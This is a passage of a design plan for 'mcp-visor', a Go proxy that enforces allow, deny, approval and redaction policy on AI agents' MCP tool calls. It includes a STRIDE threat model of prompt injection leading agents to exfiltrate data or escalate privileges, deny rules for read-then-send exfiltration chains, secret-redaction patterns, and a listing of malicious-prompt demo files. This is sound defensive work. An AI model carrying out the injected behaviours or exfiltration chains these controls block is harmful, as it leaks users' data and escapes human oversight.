**If denied:** DENY  
**Audit:** `{ "decision": "require_approval", "tool": "aws_iam_create_user", "username": "[REDACTED: potential PII]", "risk_level": "critical" }`

---

### Example 10: Block Shell Command During Non-Business Hours

**Tool call:** `shell_exec` with `command=git status` at 11:00 PM Saturday  
**Policy evaluation:**
- Tool allowlisted? Yes
- Command passes allowlist? Yes (git status is allowed)
- Time restriction: `shell_only_business_hours` — outside hours? Yes (Saturday)
- Outside action: require_approval

**Decision:** REQUIRE_APPROVAL  
**Reason:** `Shell access outside business hours requires approval`

---

### Example 11: Deny File Read → Gmail Send Chain

**Call 1:** `file_read` with `path=/home/user/projects/sensitive-report.pdf` → ALLOW  
**Call 2:** `gmail_send` with `subject=Report, attachment_path=sensitive-report.pdf`  
**Chain detection:** `file_read` (source) → `gmail_send` (sink), within 3 calls  
**Decision:** DENY  
**Reason:** `Dangerous tool chain: file_read → gmail_send (prevent_exfiltration_via_email)`

---

### Example 12: Redact and Allow Internal API Call

**Tool call:** `http_post` with `url=https://internal-api.acme-corp.com/data, headers: { Authorization: Bearer eyJhbGciOi... }`  
**Policy evaluation:**
- Tool allowlisted? Yes
- Destination: `internal-api.acme-corp.com` matches allowed domain pattern `*.acme-corp.com`? Yes
- Sensitive data: JWT token detected in `Authorization` header

**Decision:** ALLOW (redacted)  
**Action:** Authorization header value replaced with `[REDACTED: JWT Token]`, then call forwarded  
**Audit:** `{ "decision": "allow", "redacted": true, "fields_redacted": ["headers.Authorization"] }`

---

## 8. Threat Model

### Threat Actors and Goals

| Threat Actor | Goal | Capability |
|---|---|---|
| External attacker via prompt injection | Exfiltrate data, execute commands, escalate privileges | Controls prompt content (via email, web page, document) but not the MCP Visor host |
| Malicious insider (developer) | Bypass policy rules, access restricted tools | Has access to MCP Visor configuration and host |
| Compromised MCP server | Steal data, lie about tool capabilities, return malicious outputs | Controls a server that the visor connects to |
| Compromised MCP client/agent | Abuse legitimate tool access for malicious purposes | Controls the client that connects to the visor |
| Malicious tool author | Introduce dangerous tool into the ecosystem | Publishes an MCP server with hidden dangerous functionality |

### STRIDE-Based Threat Analysis

#### 1. Spoofing

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Spoofed agent identity | Attacker connects as a more-privileged agent | Identity-based policies. v1: agent ID from connection config. v2: token/auth-based identity |
| Spoofed MCP server | Malicious server impersonates legitimate server | Server name must match policy config. v1 trusts server name from client. v2 can validate server certificate or binary hash |
| Spoofed approval | Attacker forges an approval response | v1 file-based approval assumes host filesystem integrity. v2 can cryptographically sign approvals |

#### 2. Tampering

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Policy file tampering | Attacker modifies policy to allow dangerous tools | Policy file should be owned by root/administrator. v1 assumes filesystem integrity. v2 can validate policy signature |
| Audit log tampering | Attacker deletes or modifies audit logs to cover tracks | v1: logs are local files. Recommend append-only logging (e.g., file opened with O_APPEND). v2: stream to external SIEM |
| In-flight MCP message tampering | Attacker modifies tool calls between visor and server | If visor runs on same host as server, use stdio (local pipe). If remote, use TLS (mTLS in v2). v1 assumes local transport |
| Tool output tampering | Server returns malicious output designed to exploit the LLM | v1 does not inspect output content beyond redaction patterns. Output sanitization against prompt injection is a separate concern |

#### 3. Repudiation

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Agent denies making a tool call | No proof that a specific agent initiated a call | Audit logs include session and agent IDs. v2 can include request signatures |
| Approver denies approving | No proof of approval | Approval events are logged with timestamp and approver identity (v1: based on who wrote the approval file) |

#### 4. Information Disclosure

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Secrets in tool arguments | API keys, tokens, passwords in tool call parameters | Redaction engine strips secrets before forwarding to server and logging |
| Secrets in tool outputs | Tool returns credentials, .env content, database passwords | Output redaction scans results before returning to client |
| Audit log contains secrets | Logged arguments include unredacted secrets | All logged arguments are redacted before writing to audit log |
| Internal topology exposure | Tool calls reveal internal hostnames, IPs, URLs | Redaction patterns for internal IPs and hostnames. Classify internal URLs |

#### 5. Denial of Service

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Session exhaustion | Attacker opens thousands of sessions | v1: no built-in rate limiting (NFR for v2). Can rely on host-level limits |
| Large argument DDoS | Tool call with extremely large arguments | `max_argument_size_bytes` setting rejects oversized calls |
| Large output DDoS | Tool returns gigabytes of data | `max_output_size_bytes` setting truncates or rejects oversized responses |
| Approval exhaustion | Attacker floods approval queue | v1: each session has one pending approval at a time. v2: rate limiting |
| Policy file watcher exploit | Rapid policy changes cause CPU exhaustion | Debounce policy reloads (e.g., 5-second cooldown between reloads) |

#### 6. Elevation of Privilege

| Threat | Description | Control in mcp-visor |
|---|---|---|
| Prompt injection escalates tool access | LLM is tricked into calling a tool it shouldn't | Deterministic policy engine cannot be tricked by prompt injection. It checks tool name, not LLM intent |
| Tool chain escalation | Individual tools are low-risk but combined they are high-risk | Chain detector identifies dangerous sequences regardless of individual tool risk |
| Config file escalation | Attacker gains write access to visor config | v1: assumes filesystem security. v2: config signing and integrity checks |
| Approval bypass | Attacker finds a way to skip the approval step | Approval is enforced in the decision engine, not in the client. Client cannot bypass it |

### Threat Control Matrix

| Control | Prompt Injection | Tool Poisoning | Malicious Server | Compromised Client | Data Exfiltration | Token Leakage | Confused Deputy | Excessive Permissions | Unsafe Chaining | Approval Bypass | Log Tampering |
|---|---|---|---|---|---|---|---|---|---|---|---|
| Tool Allowlist | ✓ | - | ✓ | - | - | - | - | ✓ | - | - | - |
| Tool Denylist | ✓ | - | ✓ | - | - | - | - | ✓ | - | - | - |
| Argument Validation | - | - | - | ✓ | - | - | - | - | - | - | - |
| Redaction Engine | - | - | - | - | ✓ | ✓ | - | - | - | - | ✓ |
| Chain Detector | ✓ | - | - | ✓ | ✓ | - | ✓ | - | ✓ | - | - |
| Approval Engine | ✓ | - | - | - | - | - | - | - | - | ✓ | - |
| Risk Classifier | - | - | - | - | - | - | - | ✓ | - | - | - |
| Audit Logger | - | - | - | - | - | - | - | - | - | - | ✓ |
| Time Restrictions | ✓ | - | - | - | - | - | - | - | - | - | - |
| Domain Allowlist | - | - | - | - | ✓ | - | - | - | - | - | - |
| Identity Policies | ✓ | - | - | ✓ | - | - | ✓ | ✓ | - | - | - |

---

## 9. Technology Recommendation

### Comparison

| Criterion | TypeScript/Node.js | Go | Rust | C/C++ |
|---|---|---|---|---|
| MCP ecosystem compatibility | Excellent. MCP SDK is TypeScript-native. MCP servers are often Node.js | Good. Go MCP libraries exist. Can handle stdio | Limited. Few MCP libraries. Would need protocol implementation | None. Would need full protocol implementation from scratch |
| Development speed | Fast. Large ecosystem, rapid prototyping | Fast. Simple language, good tooling | Moderate. Steep learning curve, slower iteration | Slow. Manual memory management, complex build systems |
| Performance | Moderate. Single-thread event loop | Good. Goroutines, efficient concurrency | Excellent. Near-C performance | Excellent. Maximum control |
| Memory safety | Garbage collected | Garbage collected | Ownership model, no GC | Manual. High risk of vulnerabilities |
| Security posture | Good. No buffer overflows. Dependency chain risk | Good. No buffer overflows. Smaller dependency trees | Excellent. No data races at compile time. Minimal runtime | Poor. Buffer overflows, use-after-free, format string bugs |
| Deployment | npm package, Docker | Single binary, Docker | Single binary, Docker | Complex. Platform-specific builds |
| Real-time enforcement suitability | Good enough for MCP proxy throughput (tool calls are not high-frequency) | Good. Lightweight concurrency | Excellent. Lowest latency | Overkill. Complexity not justified |
| Hiring/contribution pool | Very large | Large | Growing | Smaller |
| "Bare-metal" marketing fit | Low | Medium | High | Highest (but misleading) |

### Recommendation: Go for v1

**Primary recommendation: Go**

Go is the pragmatic choice for v1 for these reasons:

1. **Single static binary.** No runtime dependencies. `mcp-visor serve --policy policies/production.yaml` is the entire deployment. No npm install, no Python venv, no JVM. This is critical for a security tool that needs to be dropped into diverse environments.

2. **Strong stdio support.** MCP uses stdio transport heavily. Go's `os/exec`, `io.Pipe`, and `bufio` are excellent for managing stdin/stdout with child processes (MCP servers).

3. **Good concurrency model.** Goroutines handle multiple MCP sessions naturally. One goroutine per client-session, channels for inter-component communication (policy engine, audit logger).

4. **Performance is adequate.** MCP tool calls are not high-frequency (seconds between calls, not microseconds). Go's performance is far beyond what's needed. No need for Rust/C++ level performance.

5. **Rich standard library.** JSON/YAML parsing, file watching, regex, HTTP client/server — all in stdlib or mature community packages. Minimal dependency tree.

6. **Memory safety without GC overhead concerns.** GC pause times are irrelevant at MCP call frequencies.

7. **Security posture is credible.** No buffer overflows, no use-after-free. The visor is in the trusted computing base — memory safety matters.

8. **Builds on all platforms.** `GOOS=linux GOARCH=amd64 go build` produces a deployable binary. Cross-compilation is trivial.

### Why NOT Rust for v1

Rust has a strong security narrative and would be the ideal choice for a v3/v4 that includes WASI sandboxing or syscall-level isolation. However, for v1:
- MCP ecosystem in Rust is immature. Most MCP client/server libraries are TypeScript or Python.
- Development speed is slower. Borrow checker learning curve, longer compile times.
- The performance advantage is irrelevant at MCP call frequencies.
- The memory safety advantage over Go is real but minor for this use case (Go is already memory-safe).
- Rust is a strong candidate for v2 sandbox runtime or v3 eBPF components, but premature for v1.

### Why NOT TypeScript for v1

TypeScript has the best MCP ecosystem integration (the MCP SDK is TypeScript). It's the fastest path to a working prototype. However:
- Runtime dependency (Node.js) required on host. A Go binary is simpler to deploy.
- Performance is fine but single-threaded event loop adds complexity for concurrent sessions.
- npm dependency tree is a security concern for a security tool.
- "Security tool written in JavaScript" has a weaker perception than "security tool written in Go" for some audiences.
- TypeScript is a good choice if speed-to-prototype is the absolute priority. It would be a valid v0/PoC path.

### Long-Term Technology Roadmap

| Phase | Technology | Component | Rationale |
|---|---|---|---|
| v1 | **Go** | MCP proxy, policy engine, audit logger | Pragmatic. Single binary. Good enough. Fast to build. |
| v2 | **Go** (primary) | Approval webhooks, SIEM export, mTLS, signed audits | Extend v1 codebase |
| v2 | **Rust** (optional) | Sandbox runner, tool execution isolation | WASI/Wasmtime for running tools in isolated sandboxes |
| v3 | **Rust** or **C** | eBPF probes for syscall telemetry | Kernel-level observability for high-risk local tool execution |
| v4+ | **Rust** | Formal policy verification, deeper host-level enforcement | Research-phase hardening |

### Avoid the C/C++ Trap

The original idea mentions "C/C++ and hypervisor-like enforcement." This is a common instinct for security tools — reach for the lowest-level language for maximum control. For a v1 MCP proxy, this is likely a mistake:

- MCP operates at the JSON-RPC protocol level, not at the syscall level
- The proxy doesn't need bare-metal performance. It needs protocol parsing, policy evaluation, and I/O
- Writing protocol parsers and JSON handling in C introduces memory safety risks in the tool meant to be the trusted computing base
- Development velocity would be dramatically slower
- The resulting codebase would be harder to audit, contribute to, and maintain
- The "hypervisor" framing is misleading — a userspace proxy is not a hypervisor, regardless of the language

If the ambition is deeper host-level enforcement, that's a v4+ roadmap item, and Rust (not C/C++) is the appropriate language for it. For v1, build a credible, practical, working enforcement proxy in Go. Ship it. Prove the model works. Then harden incrementally.

---

## 10. Repository Structure

```
mcp-visor/
├── README.md
├── LICENSE                          (MIT)
├── PLAN.md                          (this document)
├── ROADMAP.md
├── CHANGELOG.md
├── CONTRIBUTING.md
├── SECURITY.md
│
├── go.mod
├── go.sum
├── Makefile
│
├── docs/
│   ├── architecture.md              (detailed architecture with diagrams)
│   ├── threat-model.md              (full STRIDE analysis)
│   ├── policy-model.md              (policy schema reference)
│   ├── quickstart.md                (5-minute getting started)
│   ├── deployment.md                (deployment patterns)
│   └── comparison-with-evaluator.md (when to use which)
│
├── examples/
│   ├── policies/
│   │   ├── strict-deny.yaml         (default-deny for all tools)
│   │   ├── developer-medium.yaml    (allow read, deny write, approve network)
│   │   ├── full-approval.yaml       (all tools require human approval)
│   │   ├── per-identity.yaml        (different policies per agent identity)
│   │   └── business-hours.yaml      (time-based policy)
│   │
│   ├── malicious-prompts/
│   │   ├── reverse-shell.txt
│   │   ├── exfiltrate-via-http.txt
│   │   ├── read-env-and-post.txt
│   │   ├── slack-data-leak.txt
│   │   └── bypass-approval.txt
│   │
│   └── demo-mcp-server/
│       ├── main.go                   (simple MCP server with example tools)
│       ├── tools.go                   (tool implementations)
│       └── README.md
│
├── cmd/
│   └── mcp-visor/
│       └── main.go                   (entry point)
│
├── internal/
│   ├── proxy/
│   │   ├── proxy.go                  (main proxy, orchestrates components)
│   │   ├── ingress.go                (MCP client-side handler)
│   │   ├── egress.go                 (MCP server-side handler)
│   │   ├── transport/
│   │   │   ├── stdio.go              (stdio transport)
│   │   │   └── http.go               (HTTP/SSE transport - v2)
│   │   └── session.go                (session tracking per client)
│   │
│   ├── policy/
│   │   ├── engine.go                 (policy evaluation pipeline)
│   │   ├── loader.go                 (YAML policy loader + hot-reload)
│   │   ├── types.go                  (policy struct definitions)
│   │   ├── validator.go              (policy schema validation)
│   │   └── resolver.go               (tool/server/identity resolution)
│   │
│   ├── decision/
│   │   └── engine.go                 (decision aggregation: allow/deny/approve/redact)
│   │
│   ├── approval/
│   │   ├── engine.go                 (approval workflow manager)
│   │   ├── backend.go                (approval backend interface)
│   │   ├── file_backend.go           (file-based approval: watch a directory)
│   │   └── cli_backend.go            (interactive CLI approval: stdin prompt)
│   │
│   ├── audit/
│   │   ├── logger.go                 (audit event writer)
│   │   ├── event.go                  (audit event struct and serialization)
│   │   └── formatter.go              (JSON, JSONL, text output formats)
│   │
│   ├── redaction/
│   │   ├── engine.go                 (redaction pipeline)
│   │   ├── patterns.go               (built-in and custom redaction patterns)
│   │   └── scanner.go                (scan arguments/output for sensitive data)
│   │
│   ├── classifier/
│   │   └── risk.go                    (tool risk classifier)
│   │
│   ├── chain/
│   │   ├── detector.go               (tool chain state machine)
│   │   ├── rules.go                  (chain rule definitions and matching)
│   │   └── window.go                 (sliding window of recent calls)
│   │
│   ├── registry/
│   │   ├── tools.go                  (in-memory tool registry built from policy)
│   │   └── servers.go                (in-memory server registry)
│   │
│   ├── mcp/
│   │   ├── protocol.go               (MCP protocol message types)
│   │   ├── parser.go                 (MCP JSON-RPC message parsing)
│   │   └── client.go                 (MCP client for connecting to servers)
│   │
│   └── config/
│       ├── config.go                 (visor configuration: ports, paths, etc.)
│       └── defaults.go               (default config and embedded defaults)
│
├── tests/
│   ├── proxy_test.go
│   ├── policy_engine_test.go
│   ├── decision_engine_test.go
│   ├── approval_test.go
│   ├── audit_test.go
│   ├── redaction_test.go
│   ├── chain_detector_test.go
│   ├── integration/
│   │   ├── demo_server_test.go       (end-to-end with demo server)
│   │   └── scenarios_test.go         (test each example scenario from section 7)
│   └── fixtures/
│       ├── policies/
│       │   ├── valid-policy.yaml
│       │   ├── invalid-policy.yaml
│       │   └── strict-policy.yaml
│       └── audit-events/
│           └── expected-events.json
│
├── scripts/
│   ├── demo.sh                        (runs the full demo)
│   ├── build.sh                       (cross-compile for multiple platforms)
│   └── release.sh                     (goreleaser or manual release script)
│
└── .github/
    ├── workflows/
    │   ├── ci.yml                     (build + test + lint)
    │   ├── release.yml                (goreleaser on tag)
    │   └── security-scan.yml          (gosec, govulncheck)
    └── ISSUE_TEMPLATE/
        ├── bug_report.md
        └── feature_request.md
```

---

## 11. Milestone Plan

### Phase 0: Research and Design (1-2 weeks) — [x] Done

**Goal:** Finalize architecture, validate assumptions, create detailed component specs.

**Deliverables:**
- Finalized PLAN.md (this document)
- Architecture decision records (ADRs) for key choices
- MCP protocol specification review
- Go MCP library evaluation (existing open-source Go MCP implementations)
- Threat model document

**Acceptance Criteria:**
- Architecture reviewed by at least one other security engineer
- MCP protocol spec understood well enough to implement a proxy
- Go library choice documented with rationale

**Complexity:** Low  
**Risks:** Analysis paralysis. Time-box to 2 weeks maximum.

---

### Phase 1: Basic MCP Proxy (2-3 weeks) — [x] Done

**Goal:** Build a working MCP proxy that can sit between an MCP client and server, forward messages transparently, and log them.

**Deliverables:**
- MCP protocol message types and parser
- Stdio transport implementation (ingress + egress)
- Basic proxy that forwards `tools/list` and `tools/call` between client and server
- Session tracking (one session per client connection)
- Simple stdout logging of intercepted calls

**Acceptance Criteria:**
- Connect Claude Desktop to a filesystem MCP server through the proxy
- All tool calls are forwarded correctly
- Responses are returned correctly
- Proxy does not modify behavior (transparent passthrough)
- Unit tests for protocol parsing
- Integration test with a real MCP server

**Complexity:** Medium  
**Risks:** MCP protocol edge cases. The protocol is JSON-RPC over stdio/HTTP, which is simple in principle but has edge cases around line-delimited JSON, streaming, and error handling.

---

### Phase 2: Policy Engine (3-4 weeks) — [x] Done (policy hot-reload: pending v1.1)

**Goal:** Implement the deterministic policy evaluation pipeline and integrate it into the proxy.

**Deliverables:**
- [x] Policy YAML schema and Go struct definitions
- [x] Policy loader with validation
- [ ] Policy hot-reload via file watcher
- [x] Tool allowlist and denylist enforcement
- [x] Default-deny for unknown tools
- [x] Argument validation (path patterns, command regex, query patterns)
- [x] Server-level allow/deny
- [x] Risk classifier
- [x] Decision engine (aggregates all policy checks into a single decision: allow/deny/approve/redact)

**Acceptance Criteria:**
- [x] Load a policy file and enforce it on intercepted calls
- [ ] Policy hot-reload works (change policy file, new rules take effect within seconds)
- [x] Invalid policy files are rejected with clear error messages
- [x] All decision examples from section 7 are testable with unit tests
- [x] Default-deny posture blocks all calls unless explicitly allowed
- [x] Risk classification correctly categorizes tools

**Complexity:** High  
**Risks:** Policy schema complexity. Need to balance expressiveness with simplicity. Regex-based rules can have false positives. Testing matrix is large.

---

### Phase 3: Audit Logging (1 week) — [x] Done

**Goal:** Implement structured, redacted audit logging.

**Deliverables:**
- Audit event struct
- JSON/JSONL log writer
- Redaction of sensitive data in logged arguments
- Log rotation (optional, can rely on external logrotate)
- Session correlation in logs

**Acceptance Criteria:**
- Every intercepted call produces an audit event
- Audit events include all required fields (timestamp, session, agent, server, tool, args, decision, reason)
- Secrets in arguments are redacted in logs
- Logs are written as JSONL to a configurable path
- Log format is documented

**Complexity:** Low  
**Risks:** Low. Standard logging with redaction on top.

---

### Phase 4: Risky Chain Detection (2-3 weeks) — [x] Done

**Goal:** Track tool call sequences per session and detect dangerous chains.

**Deliverables:**
- Sliding window session state (configurable window size)
- Chain rule definitions (source pattern → sink pattern → action)
- Chain state machine (tracks "has sensitive source been accessed")
- Chain rule evaluation on each tool call
- Deny action for matched chains

**Acceptance Criteria:**
- `file_read` → `http_post` chain detected and blocked
- `database_query` → `slack_send` chain detected and blocked
- `file_read` → `file_read` (same tool twice) not flagged
- Chain window respects `within_calls` configuration
- Session state is ephemeral (lost on proxy restart)
- Chain detection works correctly with concurrent sessions

**Complexity:** Medium  
**Risks:** False positives from legitimate chains. Need careful rule design. Performance: sliding window operations are O(window_size) per call, which is negligible.

---

### Phase 5: Redaction Engine + Sensitive Data Redaction (2 weeks) — [x] Done

**Goal:** Redact sensitive data from tool arguments and outputs.

**Deliverables:**
- Configurable regex-based redaction patterns
- Argument redaction: scan tool arguments before forwarding
- Output redaction: scan tool results before returning to client
- Multiple built-in patterns (API keys, tokens, IPs, emails, connection strings)
- Redaction markers in audit logs

**Acceptance Criteria:**
- OpenAI API keys (`sk-...`) detected and redacted in arguments
- GitHub tokens (`ghp_...`) detected and redacted
- Database connection strings redacted
- JWT tokens redacted
- Internal IP addresses redacted
- Email addresses redacted
- Auditable: log records what was redacted without exposing the raw secret
- Redaction does not break valid tool calls (e.g., redaction in arguments that affect tool behavior should be logged at minimum)

**Complexity:** Medium  
**Risks:** Redacting too aggressively can break legitimate tool calls. Need to be configurable. Some redaction should block (secret in an auth header is expected), while some should just scrub (accidental secret in content).

---

### Phase 6: Human Approval Workflow (2-3 weeks) — [x] Done

**Goal:** Implement approval workflow for tools that require human confirmation.

**Deliverables:**
- Approval engine with pluggable backends
- File-based approval backend (watch a directory for approval/denial files)
- CLI interactive approval backend (read from stdin)
- Approval timeout handling (default deny after timeout)
- Approval context (what tool, what arguments, why approval is needed)
- Pending approval tracking (one per session, or configurable queue)

**Acceptance Criteria:**
- Tool configured with `approval_required: true` triggers approval
- File-based: writing `approve` or `deny` to the approval file makes the decision
- CLI-based: typing `yes`/`no` at the terminal makes the decision
- Timeout denies the call
- Approval events are logged
- Client receives appropriate response (success on approve, error on deny)

**Complexity:** Medium  
**Risks:** User experience of file-based approval is clunky. CLI-based only works for foreground proxy. Both are v1-appropriate. Web-based approval is a clear v2 need.

---

### Phase 7: Demo Environment (1-2 weeks) — [x] Done

**Goal:** Create a compelling demo that shows the visor's value.

**Deliverables:**
- [x] Built-in demo MCP server with example tools at various risk levels
- [x] Multiple example policies
- [x] Malicious prompt scenario scripts
- [x] `examples/demo-runner/` that runs through a scripted demo
- [x] Demo README with step-by-step walkthrough

**Acceptance Criteria:**
- [x] Anyone can clone the repo and run `go run ./examples/demo-runner/` to see a working demo
- [x] Demo covers all major features
- [x] Demo output is understandable without reading the code

**Complexity:** Low-Medium  
**Risks:** Making the demo compelling without overhyping. Keep it practical.

---

### Phase 8: Hardening, Documentation, and Open-Source Release (2-3 weeks) — [ ] In Progress

**Goal:** Polish for public release.

**Deliverables:**
- [x] Comprehensive README
- [ ] Architecture documentation with diagrams
- [ ] Policy model reference documentation
- [ ] Threat model document
- [ ] Comparison with mcp-llm-security-evaluator
- [ ] Contribution guide
- [ ] Security policy
- [ ] CHANGELOG
- [ ] CI/CD pipeline (GitHub Actions: build, test, lint, security scan)
- [ ] Release binaries for Linux, macOS (amd64, arm64)
- [ ] Docker image
- [ ] Homebrew tap (optional, nice-to-have)
- [ ] Go module release (`go get github.com/themayursinha/mcp-visor`)

**Acceptance Criteria:**
- [x] README is clear and complete
- [ ] All docs are syntactically correct Markdown with working links
- [ ] CI is green on main branch
- [ ] Release binaries are published
- [ ] `go install github.com/themayursinha/mcp-visor/cmd/mcp-visor@latest` works
- All docs are syntactically correct Markdown with working links
- CI is green on main branch
- Release binaries are published
- `go install github.com/themayursinha/mcp-visor/cmd/mcp-visor@latest` works
- All acceptance criteria from previous phases still pass

**Complexity:** Medium  
**Risks:** Documentation takes longer than expected. Release process has hidden complexity.

---

- [x] All acceptance criteria from previous phases still pass

**Complexity:** Medium  
**Risks:** Documentation takes longer than expected. Release process has hidden complexity.

---

### Summary Timeline

| Phase | Duration | Cumulative | Status |
|---|---|---|---|
| Phase 0: Research | 1-2 weeks | 1-2 weeks | [x] |
| Phase 1: Basic Proxy | 2-3 weeks | 3-5 weeks | [x] |
| Phase 2: Policy Engine | 3-4 weeks | 6-9 weeks | [x] |
| Phase 3: Audit Logging | 1 week | 7-10 weeks | [x] |
| Phase 4: Chain Detection | 2-3 weeks | 9-13 weeks | [x] |
| Phase 5: Redaction Engine | 2 weeks | 11-15 weeks | [x] |
| Phase 6: Approval Workflow | 2-3 weeks | 13-18 weeks | [x] |
| Phase 7: Demo Environment | 1-2 weeks | 14-20 weeks | [x] |
| Phase 8: Hardening + Release | 2-3 weeks | 16-23 weeks | [ ] |

**Total estimated: 4-6 months** for a solo developer working part-time. A full-time developer could complete in 2-3 months.

---

## 12. GitHub Issue Breakdown

| # | Title | Labels | Priority | Status |
|---|---|---|---|---|
| 1 | Design MCP protocol message types | `feature` `mcp` | P0 | [x] Done |
| 2 | Implement MCP stdio transport layer | `feature` `mcp` | P0 | [x] Done |
| 3 | Build transparent MCP proxy | `feature` `proxy` | P0 | [x] Done |
| 4 | Define policy YAML schema v1 | `feature` `policy` | P0 | [x] Done |
| 5 | Implement policy loader with validation | `feature` `policy` | P0 | [x] Done |
| 6 | Implement policy hot-reload (fsnotify) | `feature` `policy` | P1 | [ ] Phase 8 |
| 7 | Implement tool allowlist and denylist | `feature` `policy` | P0 | [x] Done |
| 8 | Implement argument validation rules | `feature` `policy` | P0 | [x] Done |
| 9 | Implement risk classifier | `feature` `policy` | P1 | [x] Done |
| 10 | Implement decision engine | `feature` `decision` | P0 | [x] Done |
| 11 | Integrate policy engine into proxy | `feature` `integration` | P0 | [x] Done |
| 12 | Implement structured audit logger | `feature` `audit` | P0 | [x] Done |
| 13 | Implement audit event redaction | `feature` `audit` | P0 | [x] Done |
| 14 | Implement session-aware chain tracking | `feature` `chain` | P0 | [x] Done |
| 15 | Implement chain rule matching engine | `feature` `chain` | P0 | [x] Done |
| 16 | Implement regex-based redaction engine | `feature` `redaction` | P0 | [x] Done |
| 17 | Implement output redaction | `feature` `redaction` | P1 | [x] Done |
| 18 | Implement file-based approval backend | `feature` `approval` | P1 | [x] Done |
| 19 | Implement CLI interactive approval | `feature` `approval` | P2 | [ ] v2 |
| 20 | Implement identity-based policies | `feature` `policy` | P2 | [ ] v2 |
| 21 | Implement time-based restrictions | `feature` `policy` | P2 | [ ] v2 |
| 22 | Build demo MCP server | `feature` `demo` | P1 | [x] Done |
| 23 | Create example policy files | `documentation` | P1 | [x] Done |
| 24 | Write malicious prompt scenario scripts | `documentation` | P2 | [x] Done |
| 25 | Create demo runner | `feature` `demo` | P1 | [x] Done |
| 26 | Write comprehensive README | `documentation` | P0 | [x] Done |
| 27 | Write architecture documentation | `documentation` | P0 | [ ] Phase 8 |
| 28 | Write threat model document | `documentation` | P0 | [ ] Phase 8 |
| 29 | Set up CI/CD pipeline | `infrastructure` | P0 | [ ] Phase 8 |
| 30 | Set up release pipeline (goreleaser) | `infrastructure` | P1 | [ ] Phase 8 |

---

## 13. README Outline

```markdown
# MCP Visor

> Runtime Policy Enforcement and Audit Control Plane for MCP Tool Execution

[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat&logo=go)](go.mod)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/themayursinha/mcp-visor/actions/workflows/ci.yml/badge.svg)](https://github.com/themayursinha/mcp-visor/actions/workflows/ci.yml)

---

## Problem

AI agents are increasingly connected to enterprise tools through the Model Context Protocol (MCP). These agents can read files, query databases, send Slack messages, create GitHub issues, execute shell commands, and modify cloud infrastructure.

But AI agents are probabilistic systems vulnerable to prompt injection, goal misalignment, and confused deputy attacks. Current MCP architecture has no standard enforcement point — if an agent calls a tool, the tool executes.

MCP Visor sits between the agent and the tools, enforcing deterministic policy before execution.

## Solution

MCP Visor is a **runtime policy enforcement proxy** for MCP tool calls. It intercepts every `tools/call` request, evaluates it against configurable policy rules, and makes a decision: **allow**, **deny**, **require human approval**, or **redact sensitive data** before forwarding.

It does not use an LLM to make decisions. Prompt injection cannot bypass it.

## Architecture

[Insert architecture diagram here]

MCP Visor sits as a transparent proxy between MCP clients and servers:
- **Ingress**: Accepts MCP client connections (stdio or HTTP)
- **Policy Engine**: Evaluates every tool call against allowlists, denylists, argument rules, risk classifiers, chain detectors, and redaction rules
- **Decision Engine**: Aggregates policy checks into a single decision
- **Approval Engine**: Holds dangerous calls for human confirmation
- **Egress**: Forwards allowed calls to MCP servers
- **Audit Logger**: Records every decision in redacted, structured logs

## Quickstart

```bash
# Install
go install github.com/themayursinha/mcp-visor/cmd/mcp-visor@latest

# Start with built-in demo server and default policy
mcp-visor serve --demo

# Or with your own policy
mcp-visor serve --policy policies/production.yaml
```

## Demo

```bash
git clone https://github.com/themayursinha/mcp-visor
cd mcp-visor
./scripts/demo.sh
```

## Policy Examples

**Strict deny, explicit allow:**
```yaml
default_action: deny
servers:
  - name: filesystem
    tools:
      - name: file_read
        allowed: true
```

**Deny dangerous chains:**
```yaml
tool_chains:
  - name: prevent_exfiltration
    sources:
      - tool_pattern: ".*read.*"
    sinks:
      - tool_pattern: "http_post"
    action: deny
```

[More examples →](examples/policies/)

## Comparison with mcp-llm-security-evaluator

| | mcp-llm-security-evaluator | mcp-visor |
|---|---|---|
| **Purpose** | Evaluates LLM security | Enforces tool execution policy |
| **When** | CI/CD, on-demand scans | Every tool call at runtime |
| **Output** | Reports, scores, findings | Allow/deny/approve decisions, audit logs |
| **LLM interaction** | Tests LLM responses | No LLM interaction |
| **MCP integration** | Simulated mock calls | Real MCP protocol proxy |

The evaluator tells you what can go wrong. The visor stops it at runtime.

## Threat Model

MCP Visor protects against:
- **Prompt injection**: Deterministic policy engine cannot be sweet-talked
- **Data exfiltration**: Chain detection blocks read→send sequences
- **Tool abuse**: Allowlists, denylists, and argument validation
- **Secret leakage**: Redaction engine strips API keys, tokens, passwords
- **Confused deputy**: Identity-based policies limit per-agent tool access
- **Audit tampering**: Structured, append-only audit logging

[Full threat model →](docs/threat-model.md)

## Roadmap

- [x] v1: MCP proxy, policy engine, audit logging, chain detection, redaction, approval
- [ ] v2: Webhook approvals, mTLS, signed audit logs, SIEM export, HTTP transport, Docker compose
- [ ] v3: Sandboxed tool execution (WASI/Wasmtime), eBPF syscall telemetry
- [ ] v4: Deeper host-level enforcement, formal policy verification

## Security Model

MCP Visor's security relies on:
1. **Determinism**: No LLM in the decision path
2. **Fail-closed**: Unknown tools are denied by default
3. **Minimal TCB**: Small Go binary, minimal dependencies
4. **Observability**: Every decision is logged
5. **Configurability**: Policy is human-readable YAML

Limitations (v1):
- Relies on host filesystem security (policy file integrity, log file integrity)
- No cryptographic attestation of decisions
- No mTLS between visor and remote servers
- Session state is ephemeral (lost on restart)
- Approval is file-based or CLI-based (not web-based)
- No horizontal scaling for multi-agent deployments

## Contributing

[Contributing guide →](CONTRIBUTING.md)

## License

MIT
```

---

## 14. Portfolio Positioning

### For Head of Security / Director of Security Roles

Position this project as:
- **Architectural security leadership**: Identified a gap in the MCP + AI agent ecosystem (no runtime enforcement) and designed a solution.
- **Strategic thinking**: Understood that agent security requires both evaluation (evaluator) and enforcement (visor) — complementary, not competing, tools.
- **Vendor-neutral security design**: The visor works with any MCP-compliant client or server. Not tied to a specific vendor's security model.

Narrative: *"I led the design and implementation of a runtime enforcement control plane for MCP tool execution, addressing a critical gap in AI agent security where no standard enforcement mechanism existed. The project demonstrates defense-in-depth thinking: evaluation identifies risks, enforcement stops them at runtime."*

### For Staff Security Engineer Roles

Position this project as:
- **Deep technical ownership**: Designed the policy model, threat model, architecture, and implementation of a security proxy from scratch.
